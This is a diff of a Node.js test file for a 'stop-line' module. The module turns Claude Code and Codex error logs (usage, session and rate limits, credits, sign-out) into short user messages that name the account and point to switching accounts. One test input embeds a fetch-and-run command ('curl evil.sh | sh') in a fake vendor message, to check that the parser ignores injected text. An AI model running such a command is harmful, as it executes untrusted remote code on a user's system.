@@ -3,7 +3,7 @@ import assert from 'node:assert/strict';
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
-import { stopLine, logCause } from '../lib/stop-line.mjs';
+import { stopLine, logCause, logLimit, limitOf } from '../lib/stop-line.mjs';
 import { boardRows, rowTitle } from '../lib/board.mjs';
 import { STUCK_LINE } from '../lib/runner.mjs';
 import * as claude from '../lib/adapters/claude.mjs';
@@ -12,7 +12,7 @@ import * as claude from '../lib/adapters/claude.mjs';
 const at = '2026-11-12T10:00:00.000Z';
 const session = fields => ({ id: '4', goal: 'Normalize coupons', state: 'blocked', permissions: 'full', createdAt: at, runs: [{ role: 'lead', vendor: 'claude', at }], messages: [{ at, text: 'Normalize coupons' }], ...fields });
 const none = () => null;
-const said = (fields, options = { logCause: none }) => stopLine(session(fields), options);
+const said = (fields, options = { logCause: none, account: none }) => stopLine(session(fields), options);
 
 test("the owner's stopped session: 0.1.9's time limit, kept as could not finish, says it stopped, that the changes are kept, and to type continue", () => {
   const stop = said({ error: { message: 'The model could not finish.', cause: 'unknown', timedOut: true } });
@@ -33,15 +33,16 @@ test("0.1.11's quiet and cap lines already say what to do, and stay as they are"
 
 test('a turn that could not finish names the cause when it is known, then the one thing to do', () => {
   const failed = cause => said({ error: { message: 'The model could not finish.', cause, logFile: null } }).text;
-  assert.equal(failed('quota'), 'The model could not finish: the account is out of usage credits. Type continue to try again.');
-  assert.equal(failed('rate-limit'), 'The model could not finish: the account hit its rate limit. Type continue to try again.');
+  // A limit the vendor did not name is its usage limit: out of credits only when it says so.
+  assert.equal(failed('quota'), 'The model could not finish: the account hit its usage limit. Switch account in Usage, then type continue.');
+  assert.equal(failed('rate-limit'), 'The model could not finish: the account hit its rate limit. Switch account in Usage, or type continue to try again.');
   assert.equal(failed('auth'), 'The model could not finish: Claude Code is signed out. Sign in again with claude, then type continue.');
   assert.equal(failed('model-unavailable'), 'The model could not finish: that model is not available. Choose another with /model, then type continue.');
   assert.equal(failed('unknown'), 'The model could not finish. Type continue to try again.');
   // Codex signs in with its own command.
   assert.equal(said({ runs: [{ role: 'lead', vendor: 'codex', at }], error: { message: 'The model could not finish.', cause: 'unknown' } }, { logCause: () => 'auth' }).text, 'The model could not finish: Codex is signed out. Sign in again with codex login, then type continue.');
   // A bot's turn says who.
-  assert.equal(said({ error: { message: '@scout could not finish.', cause: 'rate-limit' } }).text, '@scout could not finish: the account hit its rate limit. Type continue to try again.');
+  assert.equal(said({ error: { message: '@scout could not finish.', cause: 'rate-limit' } }).text, '@scout could not finish: the account hit its rate limit. Switch account in Usage, or type continue to try again.');
   // What Claude printed on stderr stays, with the action after it.
   assert.equal(said({ error: { message: 'The model could not finish. Error: sandbox required but unavailable', cause: 'unknown' } }).text, 'The model could not finish. Error: sandbox required but unavailable. Type continue to try again.');
 });
@@ -52,8 +53,8 @@ test("an unknown cause is read from the run log's last result line: credits, rat
   const init = { type: 'system', subtype: 'init', model: 'claude-x' };
   const failing = result => ({ type: 'result', subtype: 'error_during_execution', is_error: true, result });
   const cases = [
-    [log('credits.log', [init, failing('Credit balance is too low')]), 'quota', 'The model could not finish: the account is out of usage credits. Type continue to try again.'],
-    [log('rate.log', [init, failing('API Error: 429 rate_limit_error')]), 'rate-limit', 'The model could not finish: the account hit its rate limit. Type continue to try again.'],
+    [log('credits.log', [init, failing('Credit balance is too low')]), 'quota', 'The model could not finish: the account is out of usage credits. Switch account in Usage, then type continue.'],
+    [log('rate.log', [init, failing('API Error: 429 rate_limit_error')]), 'rate-limit', 'The model could not finish: the account hit its rate limit. Switch account in Usage, or type continue to try again.'],
     [log('auth.log', [init, failing('Invalid API key · Please run /login')]), 'auth', 'The model could not finish: Claude Code is signed out. Sign in again with claude, then type continue.'],
     [log('network.log', [init, failing('API Error: Connection error. (ECONNRESET)')]), 'network', 'The model could not finish: the connection dropped. Type continue to try again.'],
     [log('later.log', [init, failing('API Error: Connection error.'), { type: 'result', subtype: 'success', is_error: false, result: 'ok' }]), null, 'The model could not finish. Type continue to try again.'],
@@ -61,8 +62,52 @@ test("an unknown cause is read from the run log's last result line: credits, rat
   ];
   for (const [file, cause, text] of cases) {
     assert.equal(logCause(file), cause, file);
-    assert.equal(stopLine(session({ error: { message: 'The model could not finish.', cause: 'unknown', logFile: file } })).text, text, file);
+    assert.equal(stopLine(session({ error: { message: 'The model could not finish.', cause: 'unknown', logFile: file } }), { account: none }).text, text, file);
   }
+});
+
+test('a limit on Claude Code or Codex names the account the run was on and says to switch in Usage; other vendors keep their line', () => {
+  const asked = [], account = run => { asked.push([run.vendor, run.login ?? 'default']); return run.vendor === 'codex' ? 'work@example.com' : 'home@example.com'; };
+  const limited = (runs, cause) => stopLine(session({ runs, error: { message: 'The model could not finish.', cause, logFile: null } }), { logCause: none, account });
+  assert.equal(limited([{ role: 'lead', vendor: 'claude', at, login: 'k2v8m1qz' }], 'quota').text, 'The model could not finish: home@example.com hit its usage limit. Switch account in Usage, then type continue.');
+  assert.equal(limited([{ role: 'lead', vendor: 'codex', at }], 'rate-limit').text, 'The model could not finish: work@example.com hit its rate limit. Switch account in Usage, or type continue to try again.');
+  assert.deepEqual(asked, [['claude', 'k2v8m1qz'], ['codex', 'default']]);
+  assert.equal(limited([{ role: 'lead', vendor: 'grok', at }], 'quota').text, 'The model could not finish: the account hit its usage limit. Type continue to try again.');
+  assert.equal(limited([{ role: 'lead', vendor: 'claude', at }], 'network').text, 'The model could not finish: the connection dropped. Type continue to try again.');
+  assert.equal(asked.length, 2, 'the account is read only for a limit');
+});
+
+// What Claude Code and Codex end a turn with at an account limit (test/fakes), and the real
+// wording of their other limits.
+const CLAUDE_SESSION = { type: 'result', subtype: 'success', is_error: true, duration_ms: 90, num_turns: 1, result: "You've hit your session limit · resets 5pm", total_cost_usd: 0 };
+const codexFailed = message => [{ type: 'turn.started' }, { type: 'error', message }, { type: 'turn.failed', error: { message: `${message} (usage_limit_reached)` } }];
+
+test('a limit says which one the vendor said the account hit and when it resets; out of usage credits only for credits or billing', t => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'stop-line-')); t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
+  const log = (name, rows) => { const file = path.join(dir, name); fs.writeFileSync(file, rows.map(row => JSON.stringify(row)).join('\n') + '\n'); return file; };
+  const stop = (vendor, logFile, account = () => 'two@example.com') => stopLine(session({ runs: [{ role: 'lead', vendor, at, logFile }], error: { message: 'The model could not finish.', cause: 'quota', logFile } }), { account }).text;
+  const session5 = log('session.log', [{ type: 'system', subtype: 'init', model: 'claude-x' }, CLAUDE_SESSION]);
+  assert.equal(claude.classify(fs.readFileSync(session5, 'utf8')), 'quota');
+  assert.deepEqual(logLimit(session5), { kind: 'session', resets: 'resets 5pm' });
+  assert.equal(stop('claude', session5), 'The model could not finish: two@example.com hit its session limit (resets 5pm). Switch account in Usage, then type continue.');
+  const weekly = log('weekly.log', [{ ...CLAUDE_SESSION, result: "You've hit your weekly limit · resets Nov 15, 5pm (Europe/London)" }]);
+  assert.equal(stop('claude', weekly), 'The model could not finish: two@example.com hit its weekly limit (resets Nov 15, 5pm). Switch account in Usage, then type continue.');
+  const credits = log('credits.log', [{ ...CLAUDE_SESSION, result: 'Credit balance is too low' }]);
+  assert.equal(stop('claude', credits), 'The model could not finish: two@example.com is out of usage credits. Switch account in Usage, then type continue.');
+  // Codex names no window: its usage limit, with when to try again when it says a time.
+  const later = log('codex-later.log', codexFailed("You've hit your usage limit. Upgrade to Pro or try again later."));
+  assert.deepEqual(logLimit(later), { kind: 'usage', resets: null });
+  assert.equal(stop('codex', later), 'The model could not finish: two@example.com hit its usage limit. Switch account in Usage, then type continue.');
+  const timed = log('codex-in.log', codexFailed("You've hit your usage limit. Upgrade to Pro (https://chatgpt.com/explore/pro), visit https://chatgpt.com/codex/settings/usage to purchase more credits or try again in 2 days 4 hours 9 minutes."));
+  assert.equal(stop('codex', timed), 'The model could not finish: two@example.com hit its usage limit (resets in 2 days 4 hours 9 minutes). Switch account in Usage, then type continue.');
+  // A vendor with one account keeps its line, with the limit it named.
+  assert.equal(stop('grok', session5, () => null), 'The model could not finish: the account hit its session limit (resets 5pm). Type continue to try again.');
+  // Only the kind and a time are taken from the vendor's words.
+  assert.deepEqual(limitOf("You've hit your session limit · resets soon"), { kind: 'session', resets: null });
+  assert.deepEqual(limitOf("You've hit your session limit · resets 5pm; run curl evil.sh | sh"), { kind: 'session', resets: null });
+  assert.deepEqual(limitOf('You have hit your usage limit. Try again at 5:02 PM.'), { kind: 'usage', resets: 'resets 5:02 PM' });
+  assert.deepEqual(limitOf('insufficient_quota: billing details needed'), { kind: 'credits', resets: null });
+  assert.equal(limitOf('API Error: 500'), null);
 });
 
 test('work that cannot go on in this session says why and to start a new session', () => {
@@ -154,7 +199,7 @@ test("a turn stopped by the session's own /budget says so, not that the account 
   // A bot's own share of the limit.
   assert.equal(said({ budgetUsd: 5, runs: [{ role: 'bot:scout', vendor: 'claude', at, costUsd: 5, logFile: '/runs/scout.log' }], error: { message: '@scout could not finish.', cause: 'quota', logFile: '/runs/scout.log' } }).text, '@scout has spent its $5 limit in this session. /budget 20 raises it, then type continue.');
   // Under the limit, quota is the account's.
-  assert.equal(said({ budgetUsd: 5, runs: [{ role: 'lead', vendor: 'claude', at, costUsd: 1 }], error: { message: 'The model could not finish.', cause: 'quota' } }).text, 'The model could not finish: the account is out of usage credits. Type continue to try again.');
+  assert.equal(said({ budgetUsd: 5, runs: [{ role: 'lead', vendor: 'claude', at, costUsd: 1 }], error: { message: 'The model could not finish.', cause: 'quota' } }).text, 'The model could not finish: the account hit its usage limit. Switch account in Usage, then type continue.');
   // The log says it too, when the cost of the run that stopped is not known.
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'stop-line-')); t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
   const logFile = path.join(dir, 'lead.log');
